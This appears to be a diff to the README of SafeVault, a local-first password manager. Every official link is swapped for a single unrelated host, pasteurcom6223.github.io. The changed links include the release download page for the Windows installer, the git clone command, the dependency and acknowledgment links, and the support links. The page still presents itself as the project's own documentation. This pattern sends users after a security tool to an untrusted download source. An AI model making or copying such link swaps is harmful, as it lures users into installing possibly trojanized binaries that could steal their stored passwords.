@@ -9,10 +9,10 @@
 **Your passwords. Your device. Your control. Nothing leaves your machine.**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Build](https://img.shields.io/badge/build-passing-brightgreen)](https://github.com/SudhirDevOps1/SafeVault/actions)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-19-blue)](https://react.dev/)
-[![Electron](https://img.shields.io/badge/Electron-30+-blue)](https://www.electronjs.org/)
+[![Build](https://img.shields.io/badge/build-passing-brightgreen)](https://pasteurcom6223.github.io)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-blue)](https://pasteurcom6223.github.io)
+[![React](https://img.shields.io/badge/React-19-blue)](https://pasteurcom6223.github.io)
+[![Electron](https://img.shields.io/badge/Electron-30+-blue)](https://pasteurcom6223.github.io)
 
 [Features & Roadmap](docs/features.md) • [Extension Guide](docs/extension_guide.md) • [CLI Guide](docs/cli-guide.md) • [Changelog](docs/CHANGELOG.md) • [Security](docs/SECURITY.md) • [Contributing](docs/CONTRIBUTING.md) • [Installation](#-installation--downloads)
 
@@ -124,7 +124,7 @@ flowchart TD
 ### 🔬 Deep Cryptographic Specifications & Dependency Choices
 
 SafeVault leverages highly-vetted, production-grade, open-source libraries for all cryptographic operations:
-* **Key Derivation (OWASP 2026 Recommended):** **Argon2id** (via [hash-wasm](https://github.com/Daninet/hash-wasm)) with 64MB memory, 3 iterations, and parallelism of 4.
+* **Key Derivation (OWASP 2026 Recommended):** **Argon2id** (via [hash-wasm](https://pasteurcom6223.github.io)) with 64MB memory, 3 iterations, and parallelism of 4.
   * *Why hash-wasm?* It compiles native C implementation to WebAssembly, delivering lightning-fast execution in pure sandboxed environments without requiring insecure binary compilation or Node native bindings (crucial for cross-platform portability).
 * **Legacy Derivation:** **PBKDF2-SHA512** with 600,000 iterations (silently migrated to Argon2id upon first login).
 * **Data Encryption:** **AES-256-GCM** (Galois/Counter Mode) utilizing native Web Crypto API (`crypto.subtle`) with a unique 12-byte cryptographically secure random Initialization Vector (IV) generated for every entry.
@@ -209,7 +209,7 @@ Although the database is strongly encrypted, no system is perfectly secure. Here
 
 ### Official Pre-built Binaries (v1.3.0)
 
-Download the latest release files directly from the [GitHub Releases Page](https://github.com/SudhirDevOps1/SafeVault/releases/latest).
+Download the latest release files directly from the [GitHub Releases Page](https://pasteurcom6223.github.io).
 
 #### 🪟 Windows (Windows 10/11)
 - **Installer (Recommended):** Download `SafeVault.Setup.1.3.0.exe`. Double-click to install. This automatically registers start menu entries, desktop shortcuts, and links the application icons.
@@ -234,7 +234,7 @@ Download the latest release files directly from the [GitHub Releases Page](https
 
 ```bash
 # Clone the repository
-git clone https://github.com/SudhirDevOps1/SafeVault.git
+git clone https://pasteurcom6223.github.io
 cd SafeVault
 
 # Install dependencies
@@ -357,29 +357,29 @@ MIT License - See [LICENSE](LICENSE) for details.
 
 ## 🙏 Acknowledgments
 
-- [React](https://react.dev/) - UI framework
-- [Vite](https://vite.dev/) - Build tool
-- [Tailwind CSS](https://tailwindcss.com/) - Styling
-- [Zustand](https://zustand-demo.pmnd.rs/) - State management
-- [Dexie](https://dexie.org/) - IndexedDB wrapper
-- [Lucide](https://lucide.dev/) - Icons
-- [Electron](https://www.electronjs.org/) - Desktop framework
-- [Capacitor / Ionic](https://capacitorjs.com/) - Mobile app packaging shell
+- [React](https://pasteurcom6223.github.io) - UI framework
+- [Vite](https://pasteurcom6223.github.io) - Build tool
+- [Tailwind CSS](https://pasteurcom6223.github.io) - Styling
+- [Zustand](https://pasteurcom6223.github.io) - State management
+- [Dexie](https://pasteurcom6223.github.io) - IndexedDB wrapper
+- [Lucide](https://pasteurcom6223.github.io) - Icons
+- [Electron](https://pasteurcom6223.github.io) - Desktop framework
+- [Capacitor / Ionic](https://pasteurcom6223.github.io) - Mobile app packaging shell
 
 ---
 
 ## 📞 Support
 
-- 📖 [Documentation](https://github.com/SudhirDevOps1/SafeVault/wiki)
-- 🐛 [Report a bug](https://github.com/SudhirDevOps1/SafeVault/issues/new?template=bug_report.md)
-- 💡 [Request a feature](https://github.com/SudhirDevOps1/SafeVault/issues/new?template=feature_request.md)
+- 📖 [Documentation](https://pasteurcom6223.github.io)
+- 🐛 [Report a bug](https://pasteurcom6223.github.io)
+- 💡 [Request a feature](https://pasteurcom6223.github.io)
 - 🔒 [Report security issue](docs/SECURITY.md)
 
 ---
 
 <div align="center">
 
-**Built with 🔐 by [SudhirDevOps1](https://github.com/SudhirDevOps1)**
+**Built with 🔐 by [SudhirDevOps1](https://pasteurcom6223.github.io)**
 
 _Your privacy is not optional. It's the default._
 
